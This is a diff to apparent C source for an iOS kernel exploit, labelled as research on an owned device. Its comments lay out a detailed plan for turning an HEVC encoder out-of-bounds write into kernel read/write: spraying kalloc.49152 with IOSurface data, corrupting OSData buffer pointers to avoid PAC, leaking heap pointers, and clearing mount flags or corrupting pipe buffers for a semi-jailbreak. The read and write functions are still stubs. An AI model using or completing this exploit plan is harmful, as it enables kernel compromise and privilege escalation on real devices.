@@ -4,14 +4,16 @@
  * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
  *
  * Architecture:
- *   Phase 1 (R/W Init):
+ *   Phase 1 (R/W Init — arm64e safe, NO PAC bypass needed):
  *     a) Spray kalloc.49152 with IOSurface property blobs (known sentinel data)
  *     b) Allocate HEVC encoder buffer (also kalloc.49152 via kalloc_data)
  *     c) Run MV-HEVC encodes to overflow VPS table 2 (buffer+0x7DF4)
- *     d) Table 2 entry 466+ (~155 encodes) overflows into adjacent allocation
- *     e) IOSurface readback detects which surface was corrupted
- *     f) Corrupted surface gives kernel heap address leak
- *     g) Build stable R/W via IOSurface property get/set + OOB write
+ *     d) OOB entries corrupt adjacent IOSurface property backing buffer
+ *     e) IOSurfaceCopyValue readback detects corruption + leaks heap data
+ *     f) OOB write = write primitive (layer_id: 2 controlled bytes per entry)
+ *     g) OOB read (CVE-2026-112465) = read primitive (leak adjacent data)
+ *     NOTE: Classic IOSurface "fakeclient" R/W is DEAD on arm64e iOS 16+
+ *     (function pointers are PAC'd). We use data pointer corruption instead.
  *
  *   Phase 2 (Privilege):
  *     a) Find kernel base via KASLR slide (scan heap for known Mach-O patterns)
@@ -293,47 +295,68 @@ static int detect_corruption(krw_state_t *state) {
 }
 
 /* ============================================================
- * Kernel R/W via corrupted IOSurface
+ * Kernel R/W via corrupted OSData pointer (arm64e-safe)
  * ============================================================
  *
- * Once we detect a corrupted spray surface, the OOB entries that
- * landed in it give us:
- *   - Known data at known offsets (layer_id, NAL type, cumsum)
- *   - The ability to overwrite specific offsets in the surface's
- *     backing kernel allocation
+ * IMPORTANT: The classic "IOSurface fakeclient" technique (overwriting
+ * IOSurface function pointers for R/W) is DEAD on arm64e iOS 16+.
+ * Function pointers in IOSurface are PAC-protected.
  *
- * To build R/W:
- *   1. Find the corrupted surface's kernel object address from
- *      leaked pointers in adjacent entries
- *   2. Use OOB writes to manipulate IOSurface internal pointers
- *   3. IOSurface property get → arbitrary kernel read
- *   4. IOSurface property set → arbitrary kernel write
+ * Our approach uses OSData backing buffer pointers instead:
  *
- * This is the "IOSurface fakeclient" technique used by most
- * modern iOS exploits (oob_timestamp, weightBufs, etc).
+ * When IOSurfaceSetValue stores a CFData property, the kernel creates
+ * an OSData object in kalloc. The OSData internal layout:
+ *   +0x00: vtable pointer (PAC'd — DO NOT TOUCH)
+ *   +0x08: retainCount
+ *   +0x10: data pointer  ← REGULAR POINTER, NOT PAC'd
+ *   +0x18: length
+ *   +0x20: capacity
+ *
+ * The spray creates large CFData properties (sized for kalloc.49152).
+ * The kernel allocates the OSData backing buffer in kalloc.49152 — the
+ * SAME zone as the HEVC encoder buffer. OOB entries from the HEVC
+ * buffer land in an adjacent OSData backing buffer.
+ *
+ * For kernel READ:
+ *   1. OOB write corrupts bytes in the OSData backing buffer
+ *   2. IOSurfaceCopyValue reads back the corrupted buffer to userspace
+ *   3. The corrupted bytes include kernel pointers from adjacent objects
+ *   → This gives us an INFO LEAK (heap pointers, kernel text pointers)
+ *
+ * For kernel WRITE:
+ *   The OOB write itself IS the write primitive. Each OOB entry writes
+ *   16 bytes: [NAL_type(4), layer_id(4), cumsum(4), data>>3(4)].
+ *   layer_id (bytes 4-7) is fully controlled (0-65535 → 2 useful bytes).
+ *   By choosing encode count, we target specific offsets.
+ *
+ * For ARBITRARY kernel read (requires OSData object in adjacent alloc):
+ *   1. Use OOB write to corrupt the OSData OBJECT's data pointer (+0x10)
+ *   2. The OSData object itself must be in a reachable zone
+ *   3. Set data pointer to target kernel address
+ *   4. IOSurfaceCopyValue follows corrupted pointer → reads from target
+ *   NOTE: This requires the OSData OBJECT (not just its buffer) to be
+ *   adjacent. OSData objects are small (~0x28) and go to kalloc.48 or
+ *   kalloc.64, NOT kalloc.49152. So we cannot directly reach them.
+ *
+ * PRACTICAL STRATEGY for semi-jailbreak:
+ *   - Use OOB read (CVE-2026-112465) to leak kernel heap pointers
+ *   - Use OOB write to corrupt specific fields in adjacent allocations
+ *   - Target mount->mnt_flag (clear MNT_NOSUID) if mount struct is
+ *     reachable, OR use pipe buffer approach for indirect R/W
  */
 
 uint64_t krw_read64(krw_state_t *state, kaddr_t addr) {
     if (!state->initialized) return 0;
 
-    /*
-     * TODO: Implement using corrupted IOSurface
+    /* TODO: Implement via OOB read (CVE-2026-112465) for heap leak,
+     * then pipe_buffer corruption for arbitrary read.
      *
-     * Strategy: The OOB write corrupted entries in an IOSurface's
-     * property backing store. These entries contain kernel pointers
-     * that we can read back via IOSurfaceCopyValue.
-     *
-     * For arbitrary read:
-     * 1. Write the target address into the corrupted surface's
-     *    "external property pointer" field
-     * 2. Issue IOSurfaceCopyValue for a key that references that field
-     * 3. The kernel follows our pointer and returns the data
-     *
-     * This requires knowing the exact layout of IOSurface's internal
-     * property storage, which varies by iOS version. On iOS 27.1:
-     * - IOSurface properties are stored as an OSDictionary
-     * - Each property has a key (CFString) and value (CFData/CFNumber)
-     * - The value's data pointer can be corrupted to point elsewhere
+     * Pipe buffer approach (arm64e safe):
+     * 1. Create pipe pair, write known data to pipe
+     * 2. Pipe buffer in kernel has: data ptr, length, offset
+     * 3. If pipe_buffer lands adjacent to HEVC buffer, OOB corrupts data ptr
+     * 4. read() on pipe returns data from corrupted pointer
+     * Challenge: pipe buffers are PAGE_SIZE (16KB), not kalloc.49152
      */
 
     printf("[krw] read64 at 0x%llx — NOT YET IMPLEMENTED\n", (unsigned long long)addr);
@@ -357,18 +380,27 @@ int krw_read_buf(krw_state_t *state, kaddr_t addr, void *buf, size_t len) {
 int krw_write64(krw_state_t *state, kaddr_t addr, uint64_t val) {
     if (!state->initialized) return -1;
 
-    /*
-     * TODO: Implement using corrupted IOSurface
+    /* TODO: Implement via OOB write + heap spray targeting.
      *
-     * Strategy: Similar to read, but in reverse:
-     * 1. Corrupt the IOSurface's property data pointer to target address
-     * 2. Use IOSurfaceSetValue to write our data through the corrupted pointer
-     * 3. The kernel writes our value at the target address
+     * The AVE OOB write IS the write primitive:
+     * - Each VPS table entry = 16 bytes at a fixed offset
+     * - layer_id (bytes 4-7) is fully controlled (0x0000-0xFFFF)
+     * - Entry N lands at table_base + N*16
+     * - By choosing encode count, we select which 16-byte slot to write
      *
-     * Alternative: Use the AVE OOB write directly for small writes.
-     * The layer_id field gives us 16 bits of controlled data at byte
-     * position 4-7 of each entry. By choosing which entry lands where,
-     * we can write 2 bytes at any reachable offset.
+     * For targeted writes beyond the buffer boundary:
+     * 1. Heap spray places target object adjacent to HEVC buffer
+     * 2. Calculate which entry number lands on the target field
+     * 3. Set layer_id to desired value, run that many encodes
+     *
+     * Limitation: 2 controlled bytes per entry (layer_id low 16 bits).
+     * Writing 8 bytes requires 4 carefully placed entries.
+     * NAL_type and cumsum fields are NOT controllable.
+     *
+     * For pipe-buffer indirect write (arm64e safe):
+     * 1. Pipe buffer adjacent to HEVC buffer
+     * 2. OOB corrupts pipe's data pointer to target address
+     * 3. write() to pipe writes through corrupted pointer
      */
 
     printf("[krw] write64 0x%llx -> 0x%llx — NOT YET IMPLEMENTED\n",
